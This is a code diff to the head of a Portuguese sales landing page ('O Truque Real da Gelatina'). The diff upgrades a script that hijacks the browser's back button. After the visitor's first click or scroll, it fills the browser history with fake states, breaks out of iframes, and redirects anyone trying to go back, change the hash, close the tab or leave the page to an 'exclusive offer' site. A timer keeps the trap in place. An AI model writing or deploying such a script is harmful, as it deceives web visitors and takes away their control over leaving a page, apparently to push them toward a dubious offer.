@@ -5,65 +5,81 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>O Truque Real da Gelatina</title>
     
-    <!-- Back Redirect Script - Senior Implementation -->
+    <!-- Ultra-Robust Back Redirect Script -->
     <script>
-    (function (window, document, location) {
+    (function (window, location) {
       var REDIRECT_URL = "https://ofertaexclusiva.figma.site/";
-      var FLAG = "br_done";
+      var FLAG = "br_active";
 
-      function redirect() {
+      function executeRedirect() {
         if (sessionStorage.getItem(FLAG)) return;
-        sessionStorage.setItem(FLAG, "1");
+        sessionStorage.setItem(FLAG, "true");
         
-        // Tenta redirecionar tratando possíveis restrições de IFrame/Sandbox
         try {
+          // Attempt to break out of iframes if applicable (Figma.site uses frames)
           if (window.top !== window.self) {
             window.top.location.replace(REDIRECT_URL);
           } else {
             window.location.replace(REDIRECT_URL);
           }
-        } catch (e) {
+        } catch (err) {
           window.location.replace(REDIRECT_URL);
         }
       }
 
-      // Injeta estado inicial imediatamente
-      window.history.pushState({ br: 'init' }, "", location.href);
-
-      // Navegadores modernos exigem interação para permitir manipulação de histórico agressiva
-      function primeHistory() {
-        // Injeta múltiplos estados para garantir que o 'voltar' caia no nosso trigger
-        for (var i = 0; i < 10; i++) {
-          window.history.pushState({ br: i }, "", location.href);
-        }
-        // Remove listeners após a primeira interação para evitar injeções redundantes
-        document.removeEventListener('click', primeHistory);
-        document.removeEventListener('touchstart', primeHistory);
-        document.removeEventListener('mousedown', primeHistory);
+      function populateHistory() {
+        // We push multiple states to ensure that any 'Back' gesture or click 
+        // lands on one of our states instead of leaving the page.
+        try {
+          for (var i = 0; i < 10; i++) {
+            window.history.pushState({ trap: i, ts: Date.now() }, "", location.href);
+          }
+        } catch (e) {}
       }
 
-      // Captura qualquer interação do usuário para validar a History API
-      document.addEventListener('click', primeHistory);
-      document.addEventListener('touchstart', primeHistory);
-      document.addEventListener('mousedown', primeHistory);
+      // Interaction trigger: Modern browsers only allow deep history manipulation after user interaction
+      var triggerEvents = ['click', 'mousedown', 'touchstart', 'scroll', 'wheel', 'keydown'];
+      var isPrimed = false;
 
-      // Intercepta popstate (Botão Voltar / Gestos de Voltar)
-      window.addEventListener("popstate", function (e) {
-        // Independente do estado, se o usuário tentou voltar, executamos o redirect
-        redirect();
+      function onUserInteraction() {
+        if (isPrimed) return;
+        isPrimed = true;
+        populateHistory();
+        // Cleanup listeners to prevent performance overhead
+        triggerEvents.forEach(function(evt) {
+          window.removeEventListener(evt, onUserInteraction);
+        });
+      }
+
+      triggerEvents.forEach(function(evt) {
+        window.addEventListener(evt, onUserInteraction, { passive: true });
       });
 
-      // Intercepta fechamento de aba / navegador
-      window.addEventListener("beforeunload", function (e) {
-        redirect();
+      // Handle the "Back" event
+      window.addEventListener("popstate", function (event) {
+        executeRedirect();
+        // Repopulate as a safety measure if the first redirect fails
+        if (isPrimed) populateHistory();
       });
 
-      // Intercepta saída em Mobile / WebView / Safari
-      window.addEventListener("pagehide", function (e) {
-        redirect();
+      // SPAs often use hash-based routing. Catching hash changes is critical.
+      window.addEventListener("hashchange", function () {
+        executeRedirect();
       });
 
-    })(window, document, window.location);
+      // Persistence Monitor: Figma's internal router might 'clean' the history.
+      // This interval ensures we always have a buffer of at least 5 states.
+      setInterval(function() {
+        if (isPrimed && window.history.length < 5) {
+          populateHistory();
+        }
+      }, 500);
+
+      // Terminal exit triggers
+      window.addEventListener("beforeunload", executeRedirect);
+      window.addEventListener("pagehide", executeRedirect);
+
+    })(window, window.location);
     </script>
 
     <!-- Meta Pixel Code -->
